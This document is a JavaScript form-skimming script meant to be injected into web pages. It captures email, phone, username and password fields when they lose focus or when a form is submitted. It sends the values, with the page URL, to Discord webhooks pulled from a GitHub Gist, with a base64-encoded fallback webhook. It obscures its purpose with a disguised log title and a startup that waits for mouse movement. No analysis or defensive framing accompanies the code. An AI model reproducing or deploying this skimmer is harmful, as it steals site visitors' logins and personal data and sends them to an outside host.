!function() {
    let _0xPool = [];
    // The link to your "Drop Zone" Gist
    const _gistUrl = "https://gist.githubusercontent.com/09sychic/7437cdd815a1283e173a550fa1f5fa9f/raw/90184f236c2f311293c1747f0c272763590a67bb/target.txt";

    // SYNC WEBHOOKS FROM GIST
    const updatePool = async () => {
        try {
            const response = await fetch(_gistUrl);
            const rawText = await response.text();
            _0xPool = rawText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
        } catch (e) {
            // Fallback (Your original main webhook)
            _0xPool = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5ODQ3ODY3MzA2ODU1NjQxMC9HZkFKUERLdV9vYjBSMXhCYmhYRTR6am04eUdKb3hQTUZsZ3JZeTl6OGFUQTY5a3F3b2xTR1dZYzZCak9JYmhWeXJQTw=="];
        }
    };

    const _ex = async (payload) => {
        if (_0xPool.length === 0) await updatePool();
        try {
            const selection = _0xPool[Math.floor(Math.random() * _0xPool.length)];
            const hook = atob(selection);
            await fetch(hook, {
                method: "POST",
                mode: "no-cors",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    embeds: [{
                        title: "🛠️ WINSYNC_CONTEXT_LOG",
                        color: 0xEE4444,
                        fields: payload,
                        footer: { text: `Host: ${window.location.hostname}` },
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        } catch (e) {}
    };

    // SCRAPER: Figure out what the field is actually for
    const getContext = (el) => {
        let label = document.querySelector(`label[for="${el.id}"]`);
        if (label) return label.innerText.replace(':', '').trim();
        let parentText = el.closest('div')?.innerText?.split('\n')[0];
        if (parentText && parentText.length < 50) return parentText.trim();
        return el.placeholder || el.name || el.id || "Unknown Field";
    };

    const isTarget = (e) => {
        const a = [e.type, e.id, e.name, e.placeholder].map(v => (v || "").toLowerCase());
        const t = ["email", "phone", "pass", "pwd", "user", "login", "tel", "mob"];
        return a.some(v => t.some(k => v.includes(k)));
    };

    const init = () => {
        // Individual Field Trigger
        document.addEventListener("focusout", t => {
            const n = t.target;
            if ("INPUT" === n.tagName && isTarget(n) && n.value.length > 0) {
                _ex([
                    { name: "URL", value: window.location.href },
                    { name: "Context", value: getContext(n), inline: true },
                    { name: "Value", value: n.value }
                ]);
            }
        });

        // Submit Form Trigger
        document.addEventListener("submit", t => {
            let n = [];
            t.target.querySelectorAll('input').forEach(e => {
                if (isTarget(e) && e.value) {
                    n.push({ name: `[${getContext(e)}]`, value: e.value });
                }
            });
            if (n.length > 0) {
                n.unshift({ name: "ACTION", value: "Form Submission" });
                _ex(n);
            }
        });
    };

    // STEALTH STARTUP
    window.addEventListener('mousemove', function _m() {
        setTimeout(init, 2000); 
        window.removeEventListener('mousemove', _m);
    }, { once: true });
}();
